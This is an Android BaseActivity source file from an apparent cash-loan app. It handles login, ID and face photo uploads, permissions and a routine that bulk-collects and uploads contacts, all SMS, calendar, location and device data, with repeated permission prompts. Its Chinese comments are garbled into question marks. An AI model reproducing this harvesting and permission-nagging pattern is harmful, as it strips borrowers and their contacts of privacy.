package com.cashhub.cash.app;

import android.Manifest.permission;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.blankj.utilcode.util.CollectionUtils;
import com.cashhub.cash.app.greendao.ConfigDao;
import com.cashhub.cash.app.greendao.DaoMaster;
import com.cashhub.cash.app.greendao.DaoSession;
import com.cashhub.cash.app.greendao.ReportInfoDao;
import com.cashhub.cash.app.model.Config;
import com.cashhub.cash.common.CommonApi;
import com.cashhub.cash.common.CommonResult;
import com.cashhub.cash.common.CommonResult2;
import com.cashhub.cash.common.Host;
import com.cashhub.cash.common.KndcEvent;
import com.cashhub.cash.common.KndcStorage;
import com.cashhub.cash.common.TrackData;
import com.cashhub.cash.common.UploadData;
import com.cashhub.cash.common.utils.AdvertisingIdClient;
import com.cashhub.cash.common.utils.CommonUtil;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.tencent.bugly.crashreport.CrashReport;
import io.branch.referral.Branch;
import io.branch.referral.BranchError;
import io.branch.referral.validators.IntegrationValidator;
import java.io.FileNotFoundException;
import java.sql.Array;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.json.JSONObject;

public class BaseActivity extends AppCompatActivity {

  private static final String TAG = "BaseActivity";

  public static final String LINE_TYPE = "line_type";
  public static final String UPLOAD_TYPE = "upload_type";
  public static final String CUSTOMER_TITLE = "?????????????????????????????????????????????????????????????????????";
  public static final String REGISTER_TITLE = "????????????????????????????????????????????????????????????????????????????????????????????????";
  public static final String PRIVACY_TITLE = "???????????????????????????????????????????????????????????????";

  public static final int MODE_DEFAULT = 0;

  public static final int MODE_SONIC = 1;

  public static final int MODE_SONIC_WITH_OFFLINE_CACHE = 2;

  public static final int PERMISSION_REQUEST_CODE_STORAGE = 1;

  public static final int TAKE_PHOTO = 101;
  public static final int TAKE_CAMARA = 100;

  private static final String DATABASE_NAME = "system_info.db";//???????????????
  public DaoSession mDaoSession;
  public ConfigDao mConfigDao;
  public ReportInfoDao mReportInfoDao;
  private static boolean IS_INIT = false;
  private static boolean IS_CHECK_PERMISSION_UPLOAD = false;
  private static boolean H5_IS_REQUEST_PERMISSION = false;
  private static int REQUEST_PERMISSION_COUNT = 0;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    //????????????
    setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
    EventBus.getDefault().register(this);

    DaoMaster.DevOpenHelper helper = new DaoMaster.DevOpenHelper(this, DATABASE_NAME);
    SQLiteDatabase database = helper.getWritableDatabase();
    DaoMaster daoMaster = new DaoMaster(database);
    mDaoSession = daoMaster.newSession();

    mConfigDao = mDaoSession.getConfigDao();
    mReportInfoDao = mDaoSession.getReportInfoDao();

    initData();
    //bugly????????????
//    CrashReport.testJavaCrash();
  }

  @Override
  protected void onDestroy() {
    super.onDestroy();
    if (null != EventBus.getDefault()) {
      EventBus.getDefault().unregister(this);
    }
  }

  @Override
  protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    String lineType = KndcStorage.getInstance().getData(LINE_TYPE);
    String uploadType = KndcStorage.getInstance().getData(UPLOAD_TYPE);
    Log.d(TAG, "onActivityResult requestCode: " + requestCode);
    Log.d(TAG, "onActivityResult lineType: " + lineType);
    Log.d(TAG, "onActivityResult uploadType: " + uploadType);
    switch (requestCode) {
      case TAKE_PHOTO:
        if (resultCode == RESULT_OK) {
          try {
            //????????????????????????
            Bitmap bitmap = data.getParcelableExtra("data");
//            String imagePath = ImageUpload.getInstance().saveImageToGallery(this, bitmap);
//            KndcStorage.getInstance().setData(IMAGE_PATH, imagePath);
            CommonApi.getInstance().getPolicySign(this, lineType, uploadType, bitmap);
          } catch (Exception e) {
            openErrorPage(lineType);
            e.printStackTrace();
          }
        } else {
          openErrorPage(lineType);
        }
        break;
      case TAKE_CAMARA:
        if (resultCode == RESULT_OK) {
          try {
            //????????????????????????
            Uri uri_photo = data.getData();
            Bitmap bitmap = BitmapFactory
                .decodeStream(getContentResolver().openInputStream(uri_photo));
//            String imagePath = ImageUpload.getInstance().saveImageToGallery(this, bitmap);
//            KndcStorage.getInstance().setData(IMAGE_PATH, imagePath);
            CommonApi.getInstance().getPolicySign(this, lineType, uploadType, bitmap);
          } catch (FileNotFoundException e) {
            openErrorPage(lineType);
            e.printStackTrace();
          }
        } else {
          openErrorPage(lineType);
        }
        break;
      default:
        break;
    }
  }

  @Override
  protected void onResume() {
    super.onResume();
    Log.d(TAG, "onResume");
    //?????????????????? ???????????? - ????????????H5??????
    if (IS_INIT) {
      //??????????????????????????????
      checkPermissionKndc();
    }
  }

  @Subscribe(threadMode = ThreadMode.MAIN)
  public void onMessageEvent(KndcEvent event) {
    Log.d(TAG, "onMessageEvent: " + event.getEventName());
    Log.d(TAG, "common result:" + event.getCommonRet());
    String lineType = KndcStorage.getInstance().getData(LINE_TYPE);
    String uploadType = KndcStorage.getInstance().getData(UPLOAD_TYPE);
    if (KndcEvent.LOGOUT.equals(event.getEventName())) {
      clearUserInfo();
    } else if (KndcEvent.OPEN_CAMARA.equals(event.getEventName())) {
      openCamera();
    } else if (KndcEvent.OPEN_IMAGE_CAPTURE.equals(event.getEventName())) {
      openPicture();
    } else if (KndcEvent.GET_POLICY_SIGN.equals(event.getEventName())) {
      uploadImage(event, lineType, uploadType);
    } else if (KndcEvent.BEGIN_CHECK_PERMISSION.equals(event.getEventName())) {
      setConfigInfo(KndcStorage.H5_IS_CHECK_PERMISSION, "1");
      if (!hasPermissionKndc() && !H5_IS_REQUEST_PERMISSION) {
        Log.d(TAG, "BEGIN_CHECK_PERMISSION: checkSelfPermission");
        H5_IS_REQUEST_PERMISSION = true;
        requestPermissionKndc();
      } else {
        //????????????APP ???????????????????????????????????????
        if(IS_CHECK_PERMISSION_UPLOAD) {
          return;
        }
        IS_CHECK_PERMISSION_UPLOAD = true;

        Log.d(TAG, "onMessageEvent: collectDataAndUpload BEGIN_CHECK_PERMISSION");
        collectDataAndUpload();
      }
    } else if (KndcEvent.JS_CALL_UPLOAD_DATA.equals(event.getEventName())) {
      Log.d(TAG, "onMessageEvent: collectDataAndUpload JS_CALL_UPLOAD_DATA");
      collectDataAndUpload();
    } else if (KndcEvent.UPLOAD_IMAGE_SUCCESS.equals(event.getEventName())) {
      String uploadImageUrl = event.getUrl();
      Log.d(TAG, "common result:" + uploadImageUrl);
      if (TextUtils.isEmpty(uploadImageUrl)) {
        return;
      }
      String userToken = KndcStorage.getInstance().getData(KndcStorage.USER_TOKEN);
      CommonApi.getInstance().reportUploadSuccessData(this, userToken, uploadImageUrl, lineType);
    } else if (KndcEvent.GET_CHECK_CODE.equals(event.getEventName())) {
      String commonRet = event.getCommonRet();
      if (TextUtils.isEmpty(commonRet)) {
        //???????????????????????????
        TrackData.getInstance().getCodeFail(this);
        return;
      }
      Gson gson = new Gson();
      CommonResult2 commonResult = gson.fromJson(commonRet,
          new TypeToken<CommonResult2>() {
          }.getType());
      if (commonResult == null) {
        showToastLong("RESULT IS NULL");
        //???????????????????????????
        TrackData.getInstance().getCodeFail(this);
        return;
      }
      if (commonResult.getCode() == 0) {
        String phoneNum = event.getPhone();
        Intent intent = new Intent();
        intent.putExtra(CheckActivity.LOGIN_PHONE_NUM, phoneNum);
        intent.setClassName(this, "com.cashhub.cash.app.CheckActivity");
        startActivity(intent);
      } else {
        //???????????????????????????
        TrackData.getInstance().getCodeFail(this);
      }
    }
  }

  @Override
  protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    setIntent(intent);
    // if activity is in foreground (or in backstack but partially visible) launching the same
    // activity will skip onStart, handle this case with reInitSession
    if (intent != null &&
        intent.hasExtra("branch_force_new_session") &&
        intent.getBooleanExtra("branch_force_new_session",false)) {
      Branch.sessionBuilder(this).withCallback(branchReferralInitListener).reInit();
    }
  }

  @Override
  public void onStart() {
    super.onStart();
    Log.d(TAG, "branchReferralInitListener onStart");
    Branch.sessionBuilder(this).withCallback(branchReferralInitListener).withData(getIntent() != null ? getIntent().getData() : null).init();

//    IntegrationValidator.validate(this);
  }

  private Branch.BranchReferralInitListener branchReferralInitListener = new Branch.BranchReferralInitListener() {
    @Override
    public void onInitFinished(JSONObject linkProperties, BranchError error) {
      // do stuff with deep link data (nav to page, display content, etc)
      Log.d(TAG, "branchReferralInitListener onInitFinished");
    }
  };

  public DaoSession getDaoSession() {
    return mDaoSession;
  }

  public ConfigDao getDaoConfig() {
    return mConfigDao;
  }

  public ReportInfoDao getDaoReportInfo() {
    return mReportInfoDao;
  }

  /**
   * ??????????????????????????????????????????
   */
  public void setFullScreen(Activity activity) {
    // full screen
    supportRequestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
        WindowManager.LayoutParams.FLAG_FULLSCREEN);
    //5.x????????????????????????????????????????????????????????????????????????????????????
    Window window = activity.getWindow();
    View decorView = window.getDecorView();
    //?????? flag ??????????????????????????????????????????????????????????????????????????????
    int option = View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE;
    decorView.setSystemUiVisibility(option);
    window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
    window.setStatusBarColor(Color.TRANSPARENT);
    //????????????????????????????????????
    //window.setNavigationBarColor(Color.TRANSPARENT)
  }

  /**
   * ?????????????????????
   */
  private void initData() {
    if(IS_INIT) {
      return;
    }
    IS_INIT = true;
    Log.d(TAG, "Begin initData");

    CommonApp.initPermissions();

    //?????????Bugly
    CrashReport.initCrashReport(getApplicationContext());

    //???????????????????????????
    List<Config> configList = getDaoConfig().queryBuilder().build().list();
    if (configList == null || configList.isEmpty()) {
      Log.d(TAG, "dataOpt: configList is null or empty");
    } else {
      for (Config config : configList) {
        KndcStorage.getInstance().setData(config.getConfigKey(), config.getConfigValue());
      }
    }

    String appIsInit =
        KndcStorage.getInstance().getData(KndcStorage.APP_IS_INIT);
    Log.d(TAG, "appIsInit:" + appIsInit);

    //?????????????????? ???????????? - ????????????H5??????
//    if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
//      if (!hasPermissionKndc()) {
//        Log.d(TAG, "onMessageEvent: checkSelfPermission");
//        requestPermissionKndc();
//      }
//    }

    if (TextUtils.isEmpty(appIsInit)) {
      //???????????????
      setConfigInfo(KndcStorage.APP_IS_INIT, "1");
    }

    setConfigInfo(KndcStorage.APP_LAST_OPEN_TIME, String.valueOf(System.currentTimeMillis()));
  }

  //????????????
  public void openPicture() {

    Log.i(TAG, "??????????????????");
    Intent intent = new Intent(Intent.ACTION_PICK);  //????????? ACTION_IMAGE_CAPTURE
    intent.setType("image/*");
    startActivityForResult(intent, TAKE_CAMARA);
    Log.i(TAG, "??????????????????");
  }

  //????????????
  public void openCamera() {
    //???button?????????????????????startActivityForResult????????????
    Intent intent = new Intent();
    intent.setAction(MediaStore.ACTION_IMAGE_CAPTURE);
    startActivityForResult(intent, TAKE_PHOTO);
  }



  /**
   * ??????????????????
   */
  public void setConfigInfo(String configKey, String configValue) {
    KndcStorage.getInstance().setData(configKey, configValue);

    if(mConfigDao != null) {
      //???????????? ?????????????????????????????????app???????????????
      Config configInfo = new Config();
      configInfo.setConfigKey(configKey);
      configInfo.setConfigValue(configValue);
      mConfigDao.insertOrReplace(configInfo);
    }
  }

  /**
   * ???????????????????????????
   */
  public void setUserInfo(String phone, String token, String userId, String expire) {
    KndcStorage.getInstance().setData(KndcStorage.USER_PHONE, phone);
    KndcStorage.getInstance().setData(KndcStorage.USER_ID, userId);
    KndcStorage.getInstance().setData(KndcStorage.USER_TOKEN, token);
    KndcStorage.getInstance().setData(KndcStorage.USER_EXPIRE_TIME, expire);

    //???????????? ?????????????????????????????????app???????????????
    List<Config> configList = new ArrayList<>();
    Config configPhone = new Config();
    configPhone.setConfigKey(KndcStorage.USER_PHONE);
    configPhone.setConfigValue(phone);
    configList.add(configPhone);

    Config configToken = new Config();
    configToken.setConfigKey(KndcStorage.USER_TOKEN);
    configToken.setConfigValue(token);
    configList.add(configToken);

    Config configUserId = new Config();
    configUserId.setConfigKey(KndcStorage.USER_ID);
    configUserId.setConfigValue(userId);
    configList.add(configUserId);

    Config configExpire = new Config();
    configExpire.setConfigKey(KndcStorage.USER_EXPIRE_TIME);
    configExpire.setConfigValue(expire);
    configList.add(configExpire);

    mConfigDao.insertOrReplaceInTx(configList);
  }

  /**
   * ????????????
   */
  public void clearUserInfo() {
    try {
      KndcStorage.getInstance().setData(KndcStorage.USER_PHONE, "");
      KndcStorage.getInstance().setData(KndcStorage.USER_ID, "");
      KndcStorage.getInstance().setData(KndcStorage.USER_TOKEN, "");
      KndcStorage.getInstance().setData(KndcStorage.USER_EXPIRE_TIME, "");

      //?????????????????????
      List<Config> configList =
          mConfigDao.queryRaw("where CONFIG_KEY in ('user_token', 'user_id', 'user_phone', "
              + "'user_expire_time')");

      if (!CollectionUtils.isEmpty(configList)) {
        for (Config config : configList) {
          Log.d(TAG, config.toString());
        }
        mConfigDao.deleteInTx(configList);
      } else {
        Log.d(TAG, "configList is Null or Empty!!!");
      }
    } catch (Exception e) {
      Log.d(TAG, e.getMessage());
    }
  }

  /**
   * ????????????
   */
  private void uploadImage(KndcEvent event, String lineType, String uploadType) {
    String commonRet = event.getCommonRet();
    if (TextUtils.isEmpty(commonRet)) {
      showToastLong("UPLOAD IS FAIL");
      return;
    }
    Gson gson = new Gson();
    CommonResult commonResult = gson.fromJson(commonRet,
        new TypeToken<CommonResult>() {
        }.getType());
    if (commonResult == null) {
      showToastLong("UPLOAD IS FAIL");
      return;
    }

    if (commonResult.getCode() != 0) {
      showToastLong(commonResult.getMsg());
      return;
    }

    Map<String, String> retData = commonResult.getData();
    if (retData == null) {
      showToastLong("RESULT IS NULL");
      return;
    }

    Bitmap bitmap = event.getBitmap();
    if (null == bitmap) {
      showToastLong("RESULT DATA IS NULL");
      return;
    }

    CommonApi.getInstance().uploadImage(this, retData, bitmap);
  }

  /**
   * ??????????????????
   *
   * @param lineType ??????ocr???living???ocr???????????????????????????living?????????????????????
   */
  private void openErrorPage(String lineType) {
    if (TextUtils.isEmpty(lineType)) {
      return;
    }
    if (lineType.equals("ocr")) {
      CommonApp.navigateTo(this, Host.getH5Host(this, "/#/pagesB/pages/card_auth/err_card"));
    } else if (lineType.equals("living")) {
      CommonApp.navigateTo(this, Host.getH5Host(this, "/#/pagesB/pages/face_recog/face_result"));
    }
  }

  /**
   * ?????????????????? - long
   */
  public void showToastLong(String message) {
    Toast toast = Toast.makeText(getApplicationContext(), message, Toast.LENGTH_LONG);

    toast.setGravity(Gravity.CENTER, 0, 0);

    toast.show();
  }

  /**
   * ?????????????????? - short
   */
  public void showToastShort(String message) {
    Toast toast = Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT);

    toast.setGravity(Gravity.CENTER, 0, 0);

    toast.show();
  }

  /**
   * ?????????????????? - short
   */
  public void showToastShort1(Context context, String message) {
    Toast toast = Toast.makeText(context, message, Toast.LENGTH_SHORT);

    toast.setGravity(Gravity.CENTER, 0, 0);

    toast.show();
  }

  /**
   * ?????????????????? - short
   */
  public void showToastView(View view) {
    Toast toast = new Toast(this);

    toast.setView(view);
    toast.setGravity(Gravity.CENTER, 0, 0);

    toast.show();
  }


  //????????????????????????
  public void waitPopNumKeyboard(EditText inputText) {
    if (inputText == null) {
      return;
    }
    inputText.setFocusable(true);
    inputText.setFocusableInTouchMode(true);
    inputText.requestFocus();
    Timer timer = new Timer();//??????????????????????????????
    timer.schedule(new TimerTask() {
      @Override
      public void run() {
        InputMethodManager imm = (InputMethodManager) inputText.getContext()
            .getSystemService(Context.INPUT_METHOD_SERVICE);//?????????????????????????????????
        imm.showSoftInput(inputText, 0);
      }
    }, 300);
  }

  /**
   * ?????????????????????
   * 1.????????????
   * 2.??????
   * 3.?????????????????????
   * */
  @Override
  public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);

    Log.d(TAG,
        "onRequestPermissionsResult, requestCode:" + requestCode + ",permissions:" + permissions.toString() + ",grantResults:" + grantResults.toString());
    if(permissions.length > 0 && grantResults.length > 0) {
      Log.d(TAG,
          "onRequestPermissionsResult permission:" + permissions[0] + ",grantResult:" + grantResults[0]);
      List<String> permissionList= new ArrayList<>(Arrays.asList(permissions));
      Log.d(TAG, "onRequestPermissionsResult permissionList:" + permissionList);
      CommonApp.permissionsList.removeAll(permissionList);
      notifyJsPermissionResult(permissions[0], String.valueOf(grantResults[0]));
    }
    if(requestCode == PERMISSION_REQUEST_CODE_STORAGE) {
      if (!hasPermissionKndc()) {
        Log.d(TAG, "onMessageEvent: checkSelfPermission");
        requestPermissionKndc();
      } else {
        Log.d(TAG, "onMessageEvent: collectDataAndUpload onRequestPermissionsResult");
        collectDataAndUpload();
      }
    }
  }

  //??????????????????????????????
  public void collectDataAndUpload() {
    new Thread(() -> {
      try {
        long nowTimeStamp = System.currentTimeMillis();
        long todayStartTime = CommonUtil.getStartTimeOfDay(nowTimeStamp, "GMT+8");

        Log.d(TAG, "collectDataAndUpload BEGIN, todayStartTime:" + todayStartTime + ","
            + "nowTimeStamp:" + nowTimeStamp);

        UploadData uploadData = new UploadData(this);

        //?????????????????????  ????????????APP????????????
//        String calendarLastTime =
//            KndcStorage.getInstance().getData(KndcStorage.CONFIG_CALENDAR_TIME);
//        if(!TextUtils.isEmpty(calendarLastTime)) {
//          long calendarLastTimeStamp = Long.parseLong(calendarLastTime);
//          if(calendarLastTimeStamp < todayStartTime) {
//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
//            uploadData.getAndSendContact();
//            setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
//          }
//        }
        try {

          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
          uploadData.getAndSendContact();
          setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
        } catch (Exception e) {
          Log.d(TAG, e.getMessage());
          e.printStackTrace();
        }

        //????????????  ????????????APP????????????
//        String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
//        if(!TextUtils.isEmpty(smsLastTime)) {
//          long smsLastTimeStamp = Long.parseLong(smsLastTime);
//          if(smsLastTimeStamp < todayStartTime) {
//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
//            uploadData.getAndSendSms(smsLastTimeStamp);
//            setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
//          }
//        }
        try {
          String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
          long smsLastTimeStamp = 0;
          if(!TextUtils.isEmpty(smsLastTime)) {
            smsLastTimeStamp = Long.parseLong(smsLastTime);
          }
          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
          uploadData.getAndSendSms(smsLastTimeStamp);
          setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
        } catch (Exception e) {
          Log.d(TAG, e.getMessage());
          e.printStackTrace();
        }

        try {
          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
          uploadData.getAndSendCalendar();
          setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
        } catch (Exception e) {
          Log.d(TAG, e.getMessage());
          e.printStackTrace();
        }

        try {
          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
          uploadData.getAndSendLocation();
          setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
        } catch (Exception e) {
          Log.d(TAG, e.getMessage());
          e.printStackTrace();
        }

        //??????????????????  ????????????APP???????????? ??????adid?????????????????????????????????
//        String deviceLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_DEVICE_TIME);
//        if(!TextUtils.isEmpty(deviceLastTime)) {
//          long deviceLastTimeStamp = Long.parseLong(deviceLastTime);
//          if(deviceLastTimeStamp < todayStartTime) {
//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
//            uploadData.getAndSendDevice();
//            setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
//          }
//        }

        try {
          Log.d(TAG, "collectDataAndUpload BEGIN getAndSendDevice" );
          uploadData.getAndSendDevice();
          setConfigInfo(KndcStorage.CONFIG_DEVICE_TIME, String.valueOf(nowTimeStamp));
        } catch (Exception e) {
          Log.d(TAG, e.getMessage());
          e.printStackTrace();
        }
      } catch (Exception e) {
        Log.d(TAG, e.getMessage());
        e.printStackTrace();
      }
    }).start();//????????????
  }

  /**
   * ????????????
   * @return
   */
  public void checkPermissionKndc() {
    if(CommonApp.permissionsCallback == null || CommonApp.permissionsCallback.isEmpty()) {
      return;
    }
    for (Map.Entry<String, String> entry : CommonApp.permissionsCallback.entrySet()) {
      notifyJsPermissionResult(entry.getKey(), String.valueOf(checkSelfPermission(entry.getKey())));
    }
  }

  public boolean hasPermissionKndc() {
    if(CommonApp.permissionsList == null || CommonApp.permissionsList.isEmpty()) {
      return true;
    }
    for (String permission : CommonApp.permissionsList) {
      if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
        Log.d(TAG, "checkSelfPermission " + permission + ": false" );
      } else {
        Log.d(TAG, "checkSelfPermission " + permission + ": true" );
      }
    }
    for (String permission : CommonApp.permissionsList) {
      if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
        Log.d(TAG, "checkSelfPermission hasPermission +++++++++");
        return false;
      }
    }
    return true;
  }

  public void requestPermissionKndc() {
    if(CommonApp.permissionsList == null || CommonApp.permissionsList.isEmpty()) {
      return;
    }
    Log.d(TAG,
        "checkSelfPermission requestPermissionKndc permissionsList length:" + CommonApp.permissionsList.size());

    Log.d(TAG, "checkSelfPermission REQUEST_PERMISSION_COUNT:" + REQUEST_PERMISSION_COUNT);
    if(REQUEST_PERMISSION_COUNT > 30) {
      return;
    }

    for (String permission : CommonApp.permissionsList) {
      if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
        REQUEST_PERMISSION_COUNT ++;
        requestPermissions(new String[]{permission}, PERMISSION_REQUEST_CODE_STORAGE);
        return;
      }
    }
  }

  //????????????????????? 0 ???????????????  1????????????
  public void notifyJsPermissionResult(String permission, String type) {
    if(CommonApp.permissionsCallback == null || CommonApp.permissionsCallback.isEmpty()) {
      Log.d(TAG, "onRequestPermissionsResult notifyJsPermissionResult: permissionsCallback is "
          + "NULL");
      return;
    }
    String notifyTig = CommonApp.permissionsCallback.get(permission);
    Log.d(TAG,
        "onRequestPermissionsResult permissionsCallback:" + CommonApp.permissionsCallback.toString());
    Log.d(TAG, "onRequestPermissionsResult checkSelfPermission notifyTig:" + notifyTig);
    if(!TextUtils.isEmpty(notifyTig)) {
      KndcEvent kndcEvent = new KndcEvent();
      kndcEvent.setEventName(KndcEvent.PERMISSION_END_CALL_JS);
      kndcEvent.setPermission(notifyTig);
      kndcEvent.setType(type);
      EventBus.getDefault().post(kndcEvent);
    }
  }
}